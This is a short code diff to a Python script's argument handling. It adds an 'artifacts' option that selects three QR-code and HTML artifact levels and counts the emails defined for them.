@@ -813,7 +1442,12 @@ Levels:
 
     args = parser.parse_args()
 
-    levels = ALL_LEVELS if args.level == "all" else [args.level]
+    if args.level == "all":
+        levels = ALL_LEVELS
+    elif args.level == "artifacts":
+        levels = ["artifact_qr", "artifact_html", "artifact_safe_qr"]
+    else:
+        levels = [args.level]
     total_emails = sum(len(EMAILS.get(l, [])) for l in levels)
 
     print(f"""
